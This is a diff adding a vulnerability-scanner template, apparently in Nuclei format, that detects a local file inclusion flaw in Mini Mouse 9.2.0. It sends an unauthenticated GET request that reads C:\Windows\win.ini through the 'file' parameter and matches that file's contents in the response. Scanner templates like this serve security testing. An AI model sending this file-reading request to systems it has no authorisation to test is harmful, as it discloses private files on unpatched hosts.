@@ -1,0 +1,33 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - fonts
+    - extensions
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/file=C:%5CWindows%5Cwin.ini'
+id: minimouse-lfi
+info:
+  author: 0x_Akoko
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows
+    remote unauthenticated attackers to include and disclose the content of locally
+    stored files via the 'file' parameter.
+  metadata:
+    max-request: 1
+  name: Mini Mouse 9.2.0 - Local File Inclusion
+  reference:
+  - https://www.exploit-db.com/exploits/49744
+  severity: high
+  tags: lfi,edb,minimouse,vuln
